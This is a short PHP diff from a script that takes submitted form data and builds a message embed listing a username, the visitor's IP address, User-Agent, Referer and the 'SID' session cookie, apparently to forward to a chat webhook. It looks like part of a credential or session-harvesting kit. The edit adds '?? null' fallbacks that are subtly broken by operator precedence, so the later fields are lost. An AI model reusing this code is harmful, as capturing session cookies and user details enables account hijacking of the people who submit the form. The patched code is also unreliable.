@@ -13,11 +13,11 @@ $input = json_decode(file_get_contents('php://input'), true);
     $content = "```json\n" . json_encode($input, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT) . "\n```";
     $embed = [
         'title' => 'ユーザー名: ' . $input['formdata']['dlym6tweiywa2taq']['value'],
-        'description' => 'IPアドレス: ' . $_SERVER['REMOTE_ADDR'] . "\n" .
-                         'User-Agent: ' . $_SERVER['HTTP_USER_AGENT'] . "\n" .
-                         'Referer: ' . $_SERVER['HTTP_REFERER'] . "\n" .
+        'description' => 'IPアドレス: ' . $_SERVER['REMOTE_ADDR'] ?? null . "\n" .
+                         'User-Agent: ' . $_SERVER['HTTP_USER_AGENT'] ?? null . "\n" .
+                         'Referer: ' . $_SERVER['HTTP_REFERER'] ?? null . "\n" .
                          'Timestamp: ' . date('Y-m-d H:i:s') . "\n" .
-                         'Cookie: ' . $_COOKIE['SID'],
+                         'Cookie: ' . $_COOKIE['SID'] ?? null,
         'color' => hexdec('333333'),
         'timestamp' => date('c'),
     ];
